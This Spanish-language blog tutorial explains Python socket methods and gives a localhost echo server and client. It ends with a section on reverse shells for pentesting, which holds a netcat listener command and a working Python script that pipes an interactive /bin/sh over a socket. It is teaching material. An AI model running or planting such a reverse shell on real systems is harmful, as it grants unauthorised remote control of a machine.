---
title: "Aplicaciones Clientes Servidor usando sockets en Python"
date: 2022-05-10T23:04:40-05:00
draft: false

description: "Se muestra algunos ejemplos de cliente-servidor codificados en Python"
hideToc: false #(false: se muestra el indice a la derecha ... true no se muestra)
enableToc: true #(Se quita o no la opci贸n de derecha que permite ocultar o no)
enableTocContent: false  #(Indice pero vertical)
author: Brayan Rodriguez #(Autor)
authorEmoji: 👺

#(Etiquetas de referencia al contenido)
tags:
- Python
- Sockets
- Cliente-Servidor

categories:
- Programación
- Aplicacion

image: images/02_ClienteServidor/Cliente-Servidor.png
---

Aplicaciones cliente-servidor usando sockets 

## Algunos métodos en Python para enviar y recibir datos

***socket.recv(buffer_long)***: Este método recibe datos del socket. El argumento del método indica la cantidad máxima de datos que puede recibir.

***socket.recvfrom(buffer_long)***: Este método recibe datos y la dirección del remitente.

***socket.recv_into(buffer)***: Este método recibe datos en un buffer.

***socket.recvfrom_into(buffer)***: Este método recibe datos en un buffer.

***socket.send(bytes)***: Este método envía datos de bytes al destino especificado.

***socket.sendto(datos, dirección)***: Este método envía datos a una dirección determinada.

***socket.sendall(datos)***: Este método envía todos los datos en el búfer.

***socket.close()***: Este método libera la memoria y finaliza la conexión

## Algunos métodos para el socket en el ***servidor***

socket.bind(dirección): este método nos permite conectar la dirección con el socket, en necesario que previamente el socket se encuentre abierto antes de establecer la conexión con la dirección.

socket.listen(numero_conexiones): este método acepta como parámetro el número máximo de conexiones de los clientes TCP.

socket.accept(): este método nos permite aceptar conexiones del cliente. Este método devuelve dos valores: client_socket y la dirección del cliente. client_socket es un nuevo objeto de socket utilizado para enviar y recibir datos. Antes de usar este método, debe llamar a los métodos socket.bind(dirección) y socket.listen(numero_conexiones).

## Algunos métodos para el socket en el ***cliente***

socket.connect(dirección_ip): este método conecta al cliente a la dirección IP del servidor.

## Algunos métodos para capturar excepciones 

except socket.timeout: este bloque captura excepciones relacionadas con el vencimiento de los tiempos de espera.

except socket.gaierror: este bloque detecta errores durante la búsqueda de información sobre direcciones IP, por ejemplo, cuando usamos los métodos getaddrinfo() y getnameinfo().

except socket.error: este bloque detecta errores genéricos de entrada y salida y comunicación. Este es un bloque genérico donde puede detectar cualquier tipo de excepción.

## Implementando un servidor 

{{< highlight Python >}}

import socket
s = socket.socket()
s.bind(("localhost", 9999))
s.listen(1)
print("servidor escuchando en el puerto 9999...")
sc, addr = s.accept()

while True:
    recibido = sc.recv(1024)
    print("Recibido del cliente el mensaje de: ", recibido.decode('utf-8'))
    mensaje_servidor = "Servidor recibió el mensaje de: " + recibido.decode('utf-8')
    sc.send(bytes(mensaje_servidor.encode('utf-8')))
    if recibido == bytes("terminar",'utf-8'):
        break
print("cerrando el socket servidor")
sc.close()
s.close()

{{< /highlight >}} 

## Implementando un cliente

{{< highlight Python >}}

import socket
s = socket.socket()
s.connect(("localhost", 9999))
while True:
    mensaje = input("> ") #Console escibe
    s.send(bytes(mensaje.encode('utf-8')))
    data_server = s.recv(1024)
    print(data_server.decode('utf-8'))
    if mensaje == "terminar":
        break
print("cerrando socket cliente")
s.close()

{{< /highlight >}} 

![image info](/images/02_ClienteServidor/Test-Cliente-Servidor.jpg)

### Shell reversa

Una Shell inversa se trata de acción mediante la cual un usuario consigue acceder a la shell de un servidor externo. Por ejemplo, si estás trabajando en una fase de pentesting relacionada  con post-explotación y te gustaría crear un script que se invoque en ciertos escenarios que automáticamente hará obtener un shell para acceder al sistema de ficheros de otra máquina, podríamos construir nuestra propia shell inversa en Python.

{{< highlight Bash >}}

nc -lvnp 45679

{{< /highlight >}} 

{{< highlight Python >}}

import socket
import subprocess
import os
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 45679))
os.dup2(sock.fileno(),0)
os.dup2(sock.fileno(),1)
os.dup2(sock.fileno(),2)
shell_remote = subprocess.call(["/bin/sh", "-i"])
proc = subprocess.call(["/bin/ls", "-i"])

{{< /highlight >}} 

![image info](/images/02_ClienteServidor/reverse_shell.jpg)
